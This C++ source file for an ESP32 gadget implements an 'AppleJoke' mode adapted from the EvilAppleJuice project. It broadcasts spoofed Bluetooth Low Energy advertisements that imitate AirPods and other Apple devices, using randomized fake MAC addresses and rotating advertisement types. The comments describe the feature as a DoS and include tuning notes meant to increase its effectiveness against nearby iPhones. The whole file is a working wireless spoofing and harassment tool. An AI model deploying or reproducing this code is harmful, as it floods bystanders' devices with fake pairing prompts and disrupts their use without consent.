#include "defines.h"

#if APPLE_JOKE
#include "appleJoke.h"

#include "esp_gap_ble_api.h"

#include "../../other/EvilAppleJuice-ESP32/src/devices.hpp"

BLEAdvertising *ApAdvertising;
BLEServer *ApServer;

bool appleJokeRunning = false;
int appleDelay;

// Here init and loop is mostly just coppied from the EvilAppleJuice-ESP32 main.cpp
void initAppleJoke()
{
    appleJokeRunning = true;
    debugLog("Executing initAppleJoke");
    // Show text
    dis->fillScreen(SCWhite);
    simpleCenterText("Eating apples");
    disUp(true);

    // Init EvilAppleJuice
    BLEDevice::init("AirPods 69");

    // Create the BLE Server
    ApServer = BLEDevice::createServer();
    ApAdvertising = ApServer->getAdvertising();

    // seems we need to init it with an address in setup() step.
    esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
    ApAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
    appleDelay = 800;
}

void loopAppleJoke()
{
    resetSleepDelay();
    debugLog("Executing loopAppleJoke");
    // First generate fake random MAC
    esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    for (int i = 0; i < 6; i++)
    {
        dummy_addr[i] = betterRandom(256);

        // It seems for some reason first 4 bits
        // Need to be high (aka 0b1111), so we
        // OR with 0xF0
        if (i == 0)
        {
            dummy_addr[i] |= 0xF0;
        }
    }

    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

    // Randomly pick data from one of the devices
    // First decide short or long
    // 0 = long (headphones), 1 = short (misc stuff like Apple TV)
    int device_choice = betterRandom(2);
    if (device_choice == 0)
    {
        int index = betterRandom(17);
        oAdvertisementData.addData((char*)DEVICES[index], sizeof(DEVICES[index]));
    }
    else
    {
        int index = betterRandom(12);
        oAdvertisementData.addData((char*)SHORT_DEVICES[index], sizeof(SHORT_DEVICES[index]));
    }

    /*  Page 191 of Apple's "Accessory Design Guidelines for Apple Devices (Release R20)" recommends to use only one of
          the three advertising PDU types when you want to connect to Apple devices.
              // 0 = ADV_TYPE_IND,
              // 1 = ADV_TYPE_SCAN_IND
              // 2 = ADV_TYPE_NONCONN_IND

          Randomly using any of these PDU types may increase detectability of spoofed packets.

          What we know for sure:
          - AirPods Gen 2: this advertises ADV_TYPE_SCAN_IND packets when the lid is opened and ADV_TYPE_NONCONN_IND when in pairing mode (when the rear case btton is held).
                            Consider using only these PDU types if you want to target Airpods Gen 2 specifically.
      */

    int adv_type_choice = betterRandom(3);
    if (adv_type_choice == 0)
    {
        ApAdvertising->setAdvertisementType(ADV_TYPE_IND);
    }
    else if (adv_type_choice == 1)
    {
        ApAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
    }
    else
    {
        ApAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
    }

    // Set the device address, advertisement data
    ApAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
    ApAdvertising->setAdvertisementData(oAdvertisementData);

    // Set advertising interval
    /*  According to Apple' Technical Q&A QA1931 (https://developer.apple.com/library/archive/qa/qa1931/_index.html), Apple recommends
        an advertising interval of 20ms to developers who want to maximize the probability of their BLE accessories to be discovered by iOS.

        These lines of code fixes the interval to 20ms. Enabling these MIGHT increase the effectiveness of the DoS. Note this has not undergone thorough testing.
    */

    // ApAdvertising->setMinInterval(0x20);
    // ApAdvertising->setMaxInterval(0x20);
    // ApAdvertising->setMinPreferred(0x20);
    // ApAdvertising->setMaxPreferred(0x20);

    // Start advertising
    debugLog("Sending Advertisement...");
    ApAdvertising->start();

    bool ignoreDelay = false;
    switch (useButton())
    {
    case Up:
    {   
        appleDelay = appleDelay + 100;
        checkMaxMin(&appleDelay, 15000, 1, false);
        ignoreDelay = true;
        break;
    }
    case Down:
    {
        appleDelay = appleDelay - 100;
        checkMaxMin(&appleDelay, 15000, 1, false);
        ignoreDelay = true;
        break;
    }
    case LongUp:
    {
        appleDelay = appleDelay + 300;
        checkMaxMin(&appleDelay, 15000, 1, false);
        ignoreDelay = true;
        break;
    }
    case LongDown:
    {
        appleDelay = appleDelay - 300;
        checkMaxMin(&appleDelay, 15000, 1, false);
        ignoreDelay = true;
        break;
    }
    }
    debugLog("appleDelay is: " + String(appleDelay));
    if(ignoreDelay == false) {
        delayTask(appleDelay);
    }
    ApAdvertising->stop();
}

void exitAppleJoke()
{
    debugLog("Executing exitAppleJoke");
    // Idk
    delete ApAdvertising;
    delete ApServer;
    BLEDevice::deinit(true);
    appleJokeRunning = false;

    switchBack();
    
}

#endif
